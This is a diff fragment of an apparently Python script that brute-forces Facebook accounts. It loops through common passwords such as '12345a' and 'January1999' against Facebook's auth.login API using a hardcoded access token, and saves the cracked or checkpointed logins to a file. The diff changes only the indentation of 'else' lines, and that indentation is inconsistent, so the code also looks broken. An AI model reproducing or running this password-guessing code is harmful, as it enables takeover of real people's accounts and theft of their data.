@@ -343,7 +343,7 @@ def action():
                                                     cps.write(k+c+user+pass5+'\n')
                                                     cps.close()
                                                     cpb.append(c+user+pass5)
-                                             else:
+                                        else:
                                             pass6="jannu14345"
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
@@ -360,7 +360,7 @@ def action():
                                                     cps.write(k+c+user+pass6+'\n')
                                                     cps.close()
                                                     cpb.append(c+user+pass6)
-                                                    else:
+                                        else:
                                             pass7="12345a"
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
@@ -377,7 +377,7 @@ def action():
                                                     cps.write(k+c+user+pass7+'\n')
                                                     cps.close()
                                                     cpb.append(c+user+pass7)
-                                                    else:
+                                         else:
                                             pass8="12341234"
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
@@ -394,7 +394,7 @@ def action():
                                                     cps.write(k+c+user+pass8+'\n')
                                                     cps.close()
                                                     cpb.append(c+user+pass8)
-                                                    else:
+                                          else:
                                             pass9="abcd123"
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
@@ -411,7 +411,7 @@ def action():
                                                     cps.write(k+c+user+pass9+'\n')
                                                     cps.close()
                                                     cpb.append(c+user+pass9)
-                                                    else:
+                                          else:
                                             pass10="2000"
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
@@ -428,7 +428,7 @@ def action():
                                                     cps.write(k+c+user+pass10+'\n')
                                                     cps.close()
                                                     cpb.append(c+user+pass10)
-                                                    else:
+                                          else:
                                             pass11="20102010"
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
@@ -445,7 +445,7 @@ def action():
                                                     cps.write(k+c+user+pass11+'\n')
                                                     cps.close()
                                                     cpb.append(c+user+pass11)
-                                                    else:
+                                        else:
                                             pass12="jan2000"
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
@@ -462,7 +462,7 @@ def action():
                                                     cps.write(k+c+user+pass12+'\n')
                                                     cps.close()
                                                     cpb.append(c+user+pass12)
-                                                    else:
+                                        else:
                                             pass13="1jan2001"
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
@@ -479,7 +479,7 @@ def action():
                                                     cps.write(k+c+user+pass13+'\n')
                                                     cps.close()
                                                     cpb.append(c+user+pass13)
-                                                    else:
+                                        else:
                                             pass14="01jan2002"
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
@@ -496,7 +496,7 @@ def action():
                                                     cps.write(k+c+user+pass14+'\n')
                                                     cps.close()
                                                     cpb.append(c+user+pass14)
-                                                    else:
+                                        else:
                                             pass15="January1999"
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
